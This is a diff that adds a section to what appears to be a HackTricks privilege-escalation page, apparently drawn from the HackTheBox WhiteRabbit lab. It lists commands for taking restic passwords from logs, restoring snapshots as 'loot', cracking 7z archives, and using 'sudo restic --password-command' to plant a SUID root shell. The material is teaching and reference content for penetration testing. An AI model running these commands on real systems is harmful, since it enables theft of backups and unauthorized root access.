@@ -939,6 +939,28 @@ In this example the user `demo` can run `vim` as `root`, it is now trivial to ge
 sudo vim -c '!sh'
 ```
 
+#### restic backups & --password-command abuse
+
+Backup automation routinely leaks everything you need for lateral movement:
+
+- **Harvest repository secrets from logs**: application tables such as `command_log`, `.bash_history`, or orchestrator audit trails often contain lines like `restic init --repo rest:http://75951e6ff.whiterabbit.htb` followed by `echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd`. Export both values and interact with the repository from your box:
+
+```bash
+RESTIC_PASSWORD=ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw \
+  restic -r rest:http://75951e6ff.whiterabbit.htb snapshots
+RESTIC_PASSWORD=... restic -r rest:http://75951e6ff.whiterabbit.htb restore 272cacd5 --target ./loot
+```
+
+- **Crack encrypted loot inside the snapshot**: operators frequently stash SSH keys in passworded 7z archives. Convert them with `7z2john` and recover the password with hashcat mode `11600`, then extract the keys and drop the provided `config` to pivot into hidden SSH daemons (e.g., port 2222 inside a container).
+
+- **Exploit `sudo restic`**: restic’s `--password-command` runs a helper binary to fetch the repo password. If `sudo -l` grants `NOPASSWD: /usr/bin/restic`, that helper executes as root even when the main command fails, so you can plant a SUID shell:
+
+```bash
+sudo restic check --password-command 'cp /bin/bash /tmp/rootbash'
+sudo restic check --password-command 'chmod 6777 /tmp/rootbash'
+/tmp/rootbash -p
+```
+
 ### SETENV
 
 This directive allows the user to **set an environment variable** while executing something:
@@ -1818,6 +1840,7 @@ vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 - [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
 - [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
 - [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
+- [0xdf – HTB WhiteRabbit (restic NOPASSWD + leaked backups)](https://0xdf.gitlab.io/2025/12/13/htb-whiterabbit.html)
 - [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
 
 {{#include ../../banners/hacktricks-training.md}}
